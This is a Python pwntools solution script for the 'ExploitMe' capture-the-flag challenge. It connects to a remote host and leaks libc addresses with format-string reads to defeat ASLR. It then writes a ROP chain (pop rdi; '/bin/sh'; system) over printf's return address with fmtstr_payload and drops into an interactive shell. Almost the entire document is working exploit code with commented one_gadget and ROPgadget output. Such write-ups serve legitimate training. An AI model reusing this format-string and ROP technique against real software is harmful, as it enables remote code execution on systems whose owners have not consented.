# Solution for the challenge ExploitMe
# https://quel-hacker-es-tu.defense.gouv.fr/challenges/dicod/exploitme/
from pwnlib.fmtstr import FmtStr, fmtstr_split, fmtstr_payload
from pwn import *
import struct
import socket
import sys

# Simple IPv4 TCP client

HOST = 'exploitme.chall.quel-hacker-es-tu.fr'
PORT = 55555

if sys.argv[1] == 'local':
  s = process('./exploitme')
  # s = remote('localhost', PORT)
  CURRENT_START_main = 243
  PATH_TO_LIBC='/lib/x86_64-linux-gnu/libc.so.6'
  SHIFT = b"35"
  SHIFT_AFTER_fgets = b"59"
  DELTA = 456
else:
  s = remote(HOST, PORT)
  CURRENT_START_main = 235
  PATH_TO_LIBC='libc.so.6'
  SHIFT = b"35"
  SHIFT_AFTER_fgets = b"57"
  DELTA = 440

"""
b'$1 = 0x7f3722bcc8d0\n'
b'$2 = 0x7ffc6f4180c0\n'
b'$3 = 0xfbad2088\n'
b'$4 = 0x563ba9de6265\n'
"""

GADGET = int(sys.argv[2], 16)

context.clear(arch = 'amd64')

exploitme = ELF('exploitme')

libc = ELF(PATH_TO_LIBC)
address_libc_start_main = libc.symbols['__libc_start_main']
address_system_libc     = libc.symbols['system']

rop = ROP(libc)
gadget_pop = rop.find_gadget(['pop rdi', 'ret'])
ROP_pop_rdi_ret = gadget_pop.address

ROP_binsh = next(libc.search(b'/bin/sh'))

GADGET = address_system_libc
print("Address of __libc_start_main in libc = " + hex(address_libc_start_main))

# For IPv6, replace HOST by ::1 and AF_INET => AF_INET6

numbwritten = 0

import hexdump
def send_payload(payload):
        hexdump.hexdump(payload)
        s.sendline(payload)

        r = s.recvline()
        print(f"< {r}")
        s.recvline()
        return r

def readAt(SHIFT, numbwritten):
    cmd = b"%" + SHIFT + b"$p"
    print(b"> " + cmd)
    s.sendline(cmd)
    r = s.recvline()
    print(b"< " + r)
    s.recvline()
    numbwritten = numbwritten + len(r) + 1
    addr = int(r, 16)
    print(b'$' + SHIFT + b' = ' + r)
    return addr, numbwritten

address__libc_start_main_libc, numbwritten = readAt(b"33", numbwritten)

tmp, numbwritten = readAt(SHIFT, numbwritten)
return_address_of_printf = tmp - DELTA - 8

address_after_fgets, numbwritten = readAt(SHIFT_AFTER_fgets, numbwritten)


address_first_arg_system = return_address_of_printf + 8

"""
$ one_gadget libc.so.6
0x4484f execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x448a3 execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xe5456 execve("/bin/sh", rsp+0x60, environ)
constraints:
  [rsp+0x60] == NULL
"""
system_addr = address__libc_start_main_libc - CURRENT_START_main - address_libc_start_main  + GADGET

# ROPgadget --binary exploitme | grep "pop rdi"
# 0x000000000000125b : pop rdi ; ret
# $ ROPgadget --binary libc.so.6  | grep "pop rdi ; ret"
# 0x0000000000023a5f : pop rdi ; ret
address_pop_rdi_ret = address__libc_start_main_libc - CURRENT_START_main - address_libc_start_main + ROP_pop_rdi_ret

# print(hex(printf_got))
#Â print(hex(system_addr))
format_string = FmtStr(execute_fmt=send_payload, numbwritten=numbwritten)
print(f"Number of bytes writtern : {numbwritten} => {format_string.numbwritten}")
offset = format_string.offset

binsh = b"/bin/sh #"
address_binsh = address_first_arg_system + 0xb7

# e$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --string '/bin/sh'
# Strings information
# ============================================================
# 0x00000000001b75aa : /bin/sh

address_binsh = address__libc_start_main_libc - CURRENT_START_main - address_libc_start_main + ROP_binsh

print(f"Offset : {offset}")
data =  fmtstr_payload(offset, {
    return_address_of_printf     :  address_pop_rdi_ret, 
    return_address_of_printf +  8:  address_binsh,
    return_address_of_printf + 16:  system_addr,
    }, write_size='short')
    
hexdump.hexdump(data)

payload_size = len(data)
if payload_size > 199:
    print(f"PAYLOAD TOO BIG (payload_size ({payload_size}) > max (199)), will not work")
    sys.exit(0)

print("Overwriting PRINTF RET ADDR on STACK in GOT with GADGET ADDR")
print("return_address_of_printf = " + hex(return_address_of_printf))
print("system_addr              = " + hex(system_addr))

print("STACK STATE after execution of shell code:")
print(hex(return_address_of_printf + 16) + " : " + hex(system_addr)   + " # addr system_addr")
print(hex(return_address_of_printf +  8) + " : " + hex(address_binsh) + " # addr string '/bin/sh'")
print(hex(return_address_of_printf)      + " : " + hex(address_pop_rdi_ret)   + " # addr pop rdi ; ret")
print("x/s *" + hex(address_first_arg_system))

input("Press Enter to continue...")

s.sendline(data)

print("Execution done!")
s.interactive()
